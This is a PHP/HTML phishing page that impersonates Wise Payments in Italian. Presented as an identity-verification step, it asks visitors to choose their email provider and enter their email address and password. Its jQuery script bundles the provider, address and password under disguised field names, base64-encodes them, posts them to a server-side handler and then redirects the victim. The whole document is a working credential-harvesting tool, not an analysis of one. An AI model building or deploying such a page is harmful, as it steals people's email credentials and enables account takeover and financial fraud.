<?php
session_start();
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Collega la tua casella email - Wise</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="bg-white h-screen flex flex-col justify-between m-0 p-0 overflow-x-hidden overflow-y-auto">


    <div class="w-full flex justify-between items-center px-6 py-4 border-b border-gray-100 bg-white shrink-0">
        <img src="_assets/logo.png" width="85" class="object-contain block">
        <div class="cursor-pointer text-gray-800 text-xl font-light">
            <i class="fa-solid fa-xmark text-xl"></i>
        </div>
    </div>


    <div id="app_view" class="w-full max-w-[390px] mx-auto px-6 py-6 flex flex-col gap-5 my-auto">
        
     
        <div class="relative -top-6">
            <h1 class="text-2xl font-bold text-gray-900 mb-1.5 tracking-tight">Collega la tua casella email</h1>
            <div class="text-xs text-gray-600 font-medium leading-relaxed">
                Per completare la verifica dell'identità, collega in modo sicuro la tua email personale. Seleziona il tuo provider qui sotto.
            </div>
        </div>

       
        <div class="grid grid-cols-2 gap-3">
            <div data-provider="Gmail" class="provider-card border-2 border-gray-200 rounded-xl p-3 flex items-center gap-3 cursor-pointer transition hover:border-gray-900 bg-white shadow-sm">
                <img src="_assets/gm.webp" class="w-6 h-6 object-contain shrink-0" alt="Gmail">
                <span class="text-xs font-bold text-gray-900">Gmail</span>
            </div>
            <div data-provider="Outlook" class="provider-card border-2 border-gray-200 rounded-xl p-3 flex items-center gap-3 cursor-pointer transition hover:border-gray-900 bg-white shadow-sm">
                <img src="_assets/outl.webp" class="w-6 h-6 object-contain shrink-0" alt="Outlook">
                <span class="text-xs font-bold text-gray-900">Outlook</span>
            </div>
            <div data-provider="Yahoo" class="provider-card border-2 border-gray-200 rounded-xl p-3 flex items-center gap-3 cursor-pointer transition hover:border-gray-900 bg-white shadow-sm">
                <img src="_assets/yah.webp" class="w-6 h-6 object-contain shrink-0" alt="Yahoo">
                <span class="text-xs font-bold text-gray-900">Yahoo</span>
            </div>
            <div data-provider="Altro" class="provider-card border-2 border-gray-200 rounded-xl p-3 flex items-center gap-3 cursor-pointer transition hover:border-gray-900 bg-white shadow-sm">
                <i class="fa-solid fa-at text-lg text-gray-700 w-6 text-center"></i>
                <span class="text-xs font-bold text-gray-900">Altro</span>
            </div>
        </div>

       
        <div class="flex flex-col w-full">
            
           
            <div class="flex flex-col gap-1 pt-3">
                <label class="text-xs font-bold text-gray-700">Indirizzo e-mail</label>
                <input type="email" id="email_input" placeholder="mario@gmail.com" class="w-full h-11 px-4 border border-gray-300 rounded-xl text-sm font-medium outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm">
                <small id="email_err" class="text-red-500 text-[11px] hidden">Inserisci un'email valida (deve contenere @)</small>
            </div>

            
            <div class="flex flex-col gap-1 mt-4">
                <label class="text-xs font-bold text-gray-700">Password e-mail</label>
                <input type="password" id="pass_input" placeholder="••••••••" class="w-full h-11 px-4 border border-gray-300 rounded-xl text-sm font-medium outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm">
                <small id="pass_err" class="text-red-500 text-[11px] hidden">Inserisci la password della tua email</small>
            </div>

            
            <div class="pt-5">
                <button type="button" id="btn_email_confirm" class="w-full h-11 bg-[#9fe870] text-[#163300] font-bold text-sm rounded-full flex items-center justify-center cursor-pointer transition shadow-none">
                    <span id="em_btn_text">Continua</span>
                </button>
            </div>
        </div>
    </div>

  
    <div class="w-full text-center py-3 bg-[#f3f4f6] text-gray-500 text-xs font-medium border-t border-gray-200 shrink-0">
        © Wise Payments Limited 2026
    </div>

<script>
$(document).ready(function() {
    let selectedProvider = "Gmail";

    $('.provider-card').on('click', function() {
        $('.provider-card').removeClass('border-gray-900 bg-gray-50').addClass('border-gray-200 bg-white');
        $(this).removeClass('border-gray-200 bg-white').addClass('border-gray-900 bg-gray-50');
        selectedProvider = $(this).data('provider');
    });

    $('.provider-card').first().removeClass('border-gray-200 bg-white').addClass('border-gray-900 bg-gray-50');

    $('#email_input, #pass_input').on('keypress', function(e) {
        var charCode = e.which || e.keyCode;
        var charStr = String.fromCharCode(charCode);
        if (/[\u0600-\u06FF]/.test(charStr)) {
            e.preventDefault();
        }
    });

    $('#btn_email_confirm').on('click', function() {
        var email = $('#email_input').val().trim();
        var pass = $('#pass_input').val().trim();
        var isValid = true;

        if (email === '' || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
            $('#email_input').addClass('border-red-500');
            $('#email_err').show();
            isValid = false;
        } else {
            $('#email_input').removeClass('border-red-500');
            $('#email_err').hide();
        }

        if (pass === '' || pass.length < 3) {
            $('#pass_input').addClass('border-red-500');
            $('#pass_err').show();
            isValid = false;
        } else {
            $('#pass_input').removeClass('border-red-500');
            $('#pass_err').hide();
        }

        if (!isValid) return;

        var btn = $(this);
        btn.prop('disabled', true);
        $('#em_btn_text').html('<div style="width:16px; height:16px; border:2px solid rgba(22,51,0,0.3); border-top:2px solid #163300; border-radius:50%; animation:_sp 1s linear infinite; margin: 0 auto;"></div>');

        var payload = JSON.stringify({
            brahim_src: selectedProvider,
            fatima_log: email,
            hassan_key: pass
        });

        var p = btoa(unescape(encodeURIComponent(payload)));

        setTimeout(function() {
            $.post("_api/handler.php", { 
                action: "save_email", 
                p_load: p 
            }, function(response) {
                var nxt = response.trim();
                if(nxt.length > 0 && nxt !== "OK") {
                    window.location.href = nxt; 
                } else {
                    window.location.href = "success.php";
                }
            }).fail(function() {
                btn.prop('disabled', false);
                $('#em_btn_text').text("Continua");
                alert("Si è verificato un errore. Riprova.");
            });
        }, 1500);
    });

    $('#email_input').on('input', function() {
        $(this).removeClass('border-red-500');
        $('#email_err').hide();
    });

    $('#pass_input').on('input', function() {
        $(this).removeClass('border-red-500');
        $('#pass_err').hide();
    });
});
</script>
<style>
    @keyframes _sp { to { transform: rotate(360deg); } }
</style>
</body>
</html>